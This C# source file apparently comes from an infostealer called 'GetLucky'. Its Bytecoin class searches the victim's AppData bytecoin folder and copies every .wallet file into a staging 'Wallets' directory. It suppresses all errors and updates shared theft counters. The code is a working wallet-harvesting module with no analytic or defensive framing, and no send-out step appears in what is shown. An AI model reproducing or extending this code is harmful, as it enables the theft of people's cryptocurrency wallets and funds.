using System.IO;

namespace GetLucky
{
    class Bytecoin
    {
        public static int count = 0;
        public static string bytecoinDir = Help.AppDate + "\\bytecoin\\";
        public static void BCNcoinStr(string directorypath) 
        {
            try
            {
                if (Directory.Exists(bytecoinDir))
                {
                    foreach (FileInfo file in new DirectoryInfo(bytecoinDir).GetFiles())
                    {
                        Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
                        if (file.Extension.Equals(".wallet"))
                        {
                            file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
                        }
                    }
                    count++;
                    Wallets.count++;
                }
                else
                {
                    return;
                }


            }
            catch 
            {
            }
        }
    }
}
